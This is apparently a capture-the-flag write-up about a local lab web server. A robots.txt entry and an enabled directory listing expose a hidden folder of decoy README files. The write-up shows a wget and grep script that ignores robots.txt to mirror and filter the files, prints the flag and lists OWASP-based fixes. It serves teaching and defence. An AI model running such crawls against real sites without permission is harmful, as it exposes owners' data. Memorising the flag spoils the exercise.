# Hidden_Crawler - Documentation

## How I Found It

The investigation began with the **`robots.txt`** file (`/robots.txt`), which explicitly disallowed a directory named **`/.hidden`**.

Upon visiting `http://localhost:8080/.hidden`, I discovered that the server had **Directory Listing** enabled. This revealed a massive, deep structure of nested folders. Browsing a few manually showed that each folder contained a `README` file with a decoy message (e.g., _"Demande ton chemin à ton voisin"_).

I realized that the flag was hidden in one specific `README` file among thousands of decoys. Since manual verification was impossible, I automated the process.

## Exploitation Steps

1.  **Strategy:** "Crawl" (download) the entire directory structure recursively and use a negative filter to remove the known decoy messages.
2.  **Tooling:** I wrote a Bash script using `wget` to mirror the directory and `grep` to filter the text.
3.  **The Script:**

```bash
# 1. Create a folder to keep things clean
mkdir -p hidden_loot
cd hidden_loot

# 2. Download every README file from the folder (Recursive)
# -r: Recursive (go into every folder)
# -np: No Parent (don't go back up to index.php)
# -A README: Only download files named "README"
# -e robots=off: Ignore the robots.txt rules
echo "🕷️ Crawling... This will take about 30 seconds..."
wget -q -r -np -e robots=off -A README http://localhost:8080/.hidden/

# 3. Find the needle in the haystack
# We search for lines that DO NOT (-v) contain the boring messages
echo "🔍 Searching for the secret..."
grep -r -v "Demande ton chemin" . | grep -v "Demande à ton voisin" | grep -v "Non ce n'est toujours pas bon" | grep -v "Toujours pas tu vas craquer" | grep -v "Tu veux de l'aide" | grep "README"
```

    Result: The script filtered out thousands of decoy files and outputted the content of the single README file that contained the flag.

## Proof

**Flag:** `d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466`

**Vulnerability Type:**

- **OWASP A05:2021 - Security Misconfiguration:** The web server is configured to allow Directory Listing (Options +Indexes), allowing attackers to map the hidden structure easily.
- **OWASP A01:2021 - Broken Access Control:** Sensitive data (the flag) was unprotected and available to anyone who knew the URL (Forced Browsing).
- **Security by Obscurity:** Relying on a hidden folder name and deep nesting to hide secrets instead of using authentication.

## How to Fix

The vulnerability exists because the server openly lists its file structure and relies on secrecy rather than security.

**The Fix:**

1.  **Disable Directory Listing:** Configure the web server (Apache/Nginx) to prevent listing files when no index.php is present.
    - **Apache Fix:** Add `Options -Indexes` to the `.htaccess` file.
2.  **Access Control:** If a file is sensitive, protect it with a password (e.g., Basic Auth) or keep it outside the public web root (`/var/www/html`).
3.  **Clean Robots.txt:** Do not list sensitive paths in robots.txt. While intended to stop search engines, it serves as a roadmap for attackers.
